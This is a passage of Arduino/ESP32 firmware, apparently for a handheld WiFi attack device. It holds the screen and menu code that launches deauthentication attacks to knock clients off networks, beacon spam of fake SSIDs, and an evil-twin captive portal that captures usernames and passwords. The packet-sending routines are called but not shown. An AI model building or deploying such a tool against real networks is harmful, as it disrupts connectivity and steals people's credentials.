    tft.setTextColor(TFT_GREEN, TFT_BLACK);
    tft.drawString(String(deauthPacketsSent), 180, y, 2);
    y += lineH;
    
    tft.setTextColor(TFT_CYAN, TFT_BLACK);
    tft.drawString("Clients Kicked:", 30, y, 2);
    tft.setTextColor(TFT_GREEN, TFT_BLACK);
    tft.drawString(String(deauthKickCount), 180, y, 2);
    y += lineH;
    
    unsigned long duration = (millis() - deauthStartTime) / 1000;
    tft.setTextColor(TFT_CYAN, TFT_BLACK);
    tft.drawString("Duration:", 30, y, 2);
    tft.setTextColor(TFT_WHITE, TFT_BLACK);
    tft.drawString(String(duration) + "s", 180, y, 2);
    
    int barX = 30;
    int barY = 250;
    int barWidth = 420;
    int barHeight = 20;
    
    tft.fillRect(barX, barY, barWidth, barHeight, TFT_DARKGREY);
    int pos = (millis() / 30) % barWidth;
    tft.fillRect(barX + pos - 15, barY, 30, barHeight, TFT_RED);
    
    tft.setTextColor(TFT_RED, TFT_BLACK);
    tft.setTextSize(1);
    tft.drawCentreString("🔥 DEPLOYING DEAUTH FRAMES 🔥", 240, 278, 2);
    
    drawWiFiFooter();
}

void drawBeaconAttack() {
    tft.fillScreen(TFT_BLACK);
    drawWiFiHeader("📡 BEACON SPAM");
    
    int y = 60;
    int lineH = 35;
    
    if(beaconRunning) {
        tft.setTextColor(TFT_GREEN, TFT_BLACK);
        tft.setTextSize(2);
        tft.drawCentreString(">> SPAMMING NETWORKS <<", 240, y, 2);
        y += lineH + 10;
    } else {
        tft.setTextColor(TFT_YELLOW, TFT_BLACK);
        tft.setTextSize(2);
        tft.drawCentreString(">> READY TO SPAM <<", 240, y, 2);
        y += lineH + 10;
    }
    
    tft.setTextColor(TFT_CYAN, TFT_BLACK);
    tft.setTextSize(1);
    tft.drawString("Packets Sent:", 30, y, 2);
    tft.setTextColor(TFT_WHITE, TFT_BLACK);
    tft.drawString(String(beaconPacketsSent), 250, y, 2);
    y += lineH;
    
    tft.drawString("SSIDs:", 30, y, 2);
    tft.setTextColor(TFT_YELLOW, TFT_BLACK);
    tft.drawString(String(BEACON_SSID_COUNT), 250, y, 2);
    y += lineH;
    
    tft.drawString("Status:", 30, y, 2);
    tft.setTextColor(beaconRunning ? TFT_GREEN : TFT_DARKGREY, TFT_BLACK);
    tft.drawString(beaconRunning ? "ACTIVE" : "STOPPED", 250, y, 2);
    
    if(beaconRunning) {
        tft.setTextColor(TFT_CYAN, TFT_BLACK);
        tft.drawString("Current SSID:", 30, 200, 2);
        tft.setTextColor(TFT_ORANGE, TFT_BLACK);
        int idx = beaconSSIDIndex % BEACON_SSID_COUNT;
        tft.drawString(beaconSSIDs[idx], 250, 200, 2);
    }
    
    if(beaconRunning) {
        int barX = 30;
        int barY = 250;
        int barWidth = 420;
        int barHeight = 20;
        
        tft.fillRect(barX, barY, barWidth, barHeight, TFT_DARKGREY);
        int pos = (millis() / 50) % barWidth;
        tft.fillRect(barX + pos - 10, barY, 20, barHeight, TFT_GREEN);
        
        tft.setTextColor(TFT_GREEN, TFT_BLACK);
        tft.setTextSize(1);
        tft.drawCentreString("📡 SPAMMING FAKE NETWORKS 📡", 240, 280, 2);
    } else {
        tft.setTextColor(TFT_DARKGREY, TFT_BLACK);
        tft.setTextSize(1);
        tft.drawCentreString("SELECT to start spamming", 240, 280, 2);
    }
    
    drawWiFiFooter();
}

//==========================================================
// Init WiFi Menu
//==========================================================

void initWiFiMenu() {
    wifiState = WIFI_MENU;
    wifiSelectedItem = 0;
    wifiNetworkCount = 0;
    wifiSelectedNetwork = 0;
    deauthAPCount = 0;
    deauthRunning = false;
    beaconRunning = false;
    portalRunning = false;
    credentialsCaptured = false;
    capturedUsername = "";
    capturedPassword = "";
    selectedNetwork = "";
    fakeAPName = "";
    fakeAPRunning = false;
    drawWiFiMenu();
}

//==========================================================
// Handle WiFi Menu
//==========================================================

void handleWiFiMenu() {
    unsigned long now = millis();
    updateButton(btnUp);
    updateButton(btnDown);
    updateButton(btnSelect);
    updateButton(btnBack);
    
    // Handle captive portal
    if (portalRunning && wifiState == WIFI_CAPTIVE_PORTAL) {
        handleCaptivePortal();
        drawCaptivePortalScreen();
        return;
    }
    
    // Handle deauth attack
    if(deauthRunning && wifiState == WIFI_DEAUTHER_ATTACK) {
        if(now - deauthLastPacket > 30) {
            deauthAttack();
            deauthLastPacket = now;
        }
        if(now - deauthLastDisplay > 500) {
            drawDeautherAttack();
            deauthLastDisplay = now;
        }
    }
    
    // Handle beacon attack
    if(beaconRunning && wifiState == WIFI_BEACON_ATTACK) {
        if(now - beaconLastPacket > 20) {
            beaconAttack();
            beaconLastPacket = now;
        }
        if(now - beaconLastDisplay > 500) {
            drawBeaconAttack();
            beaconLastDisplay = now;
        }
    }
    
    // Handle BACK button
    if(isPressed(btnBack)) {
        switch(wifiState) {
            case WIFI_CAPTIVE_PORTAL:
                stopCaptivePortal();
                wifiState = WIFI_MENU;
                drawWiFiMenu();
                return;
                
            case WIFI_SELECT_NETWORK:
                wifiState = WIFI_MENU;
                drawWiFiMenu();
                return;
                
            case WIFI_DEAUTHER_ATTACK:
                deauthStop();
                wifiState = WIFI_DEAUTHER_LIST;
                drawDeautherList();
                return;
                
            case WIFI_BEACON_ATTACK:
                beaconStop();
                wifiState = WIFI_MENU;
                drawWiFiMenu();
                return;
                
            case WIFI_DEAUTHER_LIST:
                deauthStop();
                wifiState = WIFI_MENU;
                drawWiFiMenu();
                return;
                
            case WIFI_DEAUTHER_SCAN:
                deauthStop();
                wifiState = WIFI_MENU;
                drawWiFiMenu();
                return;
                
            case WIFI_SCANNING:
                wifiScanComplete = true;
                wifiScanInProgress = false;
                wifiNetworkCount = 0;
                wifiState = WIFI_MENU;
                drawWiFiMenu();
                return;
                
            case WIFI_LIST:
                wifiState = WIFI_MENU;
                drawWiFiMenu();
                return;
                
            case WIFI_DETAILS:
                wifiState = WIFI_LIST;
                drawNetworkList();
                return;
                
            case WIFI_MENU:
                currentScreen = SCREEN_MAIN;
                drawMainMenu();
                return;
        }
    }
    
    switch(wifiState) {
        case WIFI_MENU: {
            if(isPressed(btnUp)) {
                wifiSelectedItem = (wifiSelectedItem - 1 + wifiMenuLength) % wifiMenuLength;
                drawWiFiMenu();
            } else if(isPressed(btnDown)) {
                wifiSelectedItem = (wifiSelectedItem + 1) % wifiMenuLength;
                drawWiFiMenu();
            } else if(isPressed(btnSelect)) {
                switch(wifiSelectedItem) {
                    case 0: // Scan
                        wifiState = WIFI_SCANNING;
                        wifiScanComplete = false;
                        wifiScanStartTime = now;
                        drawScanningScreen();
                        performWiFiScan();
                        if(wifiNetworkCount > 0) {
                            wifiState = WIFI_SELECT_NETWORK;
                            wifiSelectedNetwork = 0;
                            drawNetworkSelection();
                        } else {
                            wifiState = WIFI_MENU;
                            drawWiFiMenu();
                        }
                        break;
                        
                    case 1: // Deauther
                        wifiState = WIFI_DEAUTHER_SCAN;
                        deauthAPCount = 0;
                        deauthSelectedIndex = 0;
                        deauthPage = 0;
                        drawDeautherScanScreen();
                        deauthScanNetworks();
                        if(deauthAPCount > 0) {
                            wifiState = WIFI_DEAUTHER_LIST;
                            drawDeautherList();
                        } else {
                            wifiState = WIFI_MENU;
                            drawWiFiMenu();
                        }
                        break;
                        
                    case 2: // Beacon Spam
                        wifiState = WIFI_BEACON_ATTACK;
                        beaconStart();
                        drawBeaconAttack();
                        break;
                        
                    case 3: // Captive Portal - Goes to network selection first
                        wifiState = WIFI_SELECT_NETWORK;
                        wifiSelectedNetwork = 0;
                        drawNetworkSelection();
                        break;
                        
                    case 4: // Back
                        currentScreen = SCREEN_MAIN;
                        drawMainMenu();
                        break;
                }
            }
            break;
        }
        
        case WIFI_SCANNING: {
            if(wifiScanComplete) {
                wifiState = WIFI_SELECT_NETWORK;
                wifiSelectedNetwork = 0;
                drawNetworkSelection();
            }
            if(now - wifiScanStartTime > WIFI_SCAN_TIMEOUT && !wifiScanComplete) {
                wifiScanComplete = true;
                wifiScanInProgress = false;
                wifiNetworkCount = 0;
                wifiState = WIFI_SELECT_NETWORK;
                drawNetworkSelection();
            }
            break;
        }
        
        case WIFI_SELECT_NETWORK: {
            if(wifiNetworkCount == 0) {
                wifiState = WIFI_MENU;
                drawWiFiMenu();
                break;
            }
            
            if(isPressed(btnUp)) {
                wifiSelectedNetwork = (wifiSelectedNetwork - 1 + wifiNetworkCount) % wifiNetworkCount;
                drawNetworkSelection();
            } else if(isPressed(btnDown)) {
                wifiSelectedNetwork = (wifiSelectedNetwork + 1) % wifiNetworkCount;
                drawNetworkSelection();
            } else if(isPressed(btnSelect)) {
                selectedNetwork = wifiSSID[wifiSelectedNetwork];
                if(selectedNetwork.length() == 0) selectedNetwork = "Hidden";
                
                // Start captive portal with selected network
                wifiState = WIFI_CAPTIVE_PORTAL;
                startCaptivePortal();
                drawCaptivePortalScreen();
            }
            break;
        }
        
        case WIFI_LIST: {
            if(wifiNetworkCount == 0) {
                wifiState = WIFI_MENU;
                drawWiFiMenu();
                break;
            }
            if(isPressed(btnUp)) {
                wifiSelectedNetwork = (wifiSelectedNetwork - 1 + wifiNetworkCount) % wifiNetworkCount;
                drawNetworkList();
            } else if(isPressed(btnDown)) {
                wifiSelectedNetwork = (wifiSelectedNetwork + 1) % wifiNetworkCount;
                drawNetworkList();
            } else if(isPressed(btnSelect)) {
                wifiState = WIFI_DETAILS;
                drawWiFiHeader("Network Details");
                drawWiFiFooter();
            }
            break;
        }
        
        case WIFI_DETAILS:
            break;
            
        case WIFI_DEAUTHER_SCAN:
            break;
            
        case WIFI_DEAUTHER_LIST: {
            if(deauthAPCount == 0) {
                wifiState = WIFI_MENU;
                drawWiFiMenu();
                break;
            }
            
            int itemsPerPage = 5;
            if(isPressed(btnUp)) {
                deauthSelectedIndex--;
                if(deauthSelectedIndex < 0) deauthSelectedIndex = deauthAPCount - 1;
                deauthPage = deauthSelectedIndex / itemsPerPage;
                drawDeautherList();
            } else if(isPressed(btnDown)) {
                deauthSelectedIndex++;
                if(deauthSelectedIndex >= deauthAPCount) deauthSelectedIndex = 0;
                deauthPage = deauthSelectedIndex / itemsPerPage;
                drawDeautherList();
            } else if(isPressed(btnSelect)) {
                deauthStart(deauthSelectedIndex);
                wifiState = WIFI_DEAUTHER_ATTACK;
                deauthLastPacket = 0;
                deauthLastDisplay = 0;
                drawDeautherAttack();
            }
            break;
        }
        
        case WIFI_DEAUTHER_ATTACK:
            break;
            
        case WIFI_BEACON_ATTACK:
            if(isPressed(btnSelect)) {
                if(beaconRunning) {
                    beaconStop();
                } else {
                    beaconStart();
                }
                drawBeaconAttack();
            }
            break;
            
        case WIFI_CAPTIVE_PORTAL:
            // Handled at top
            break;
    }
}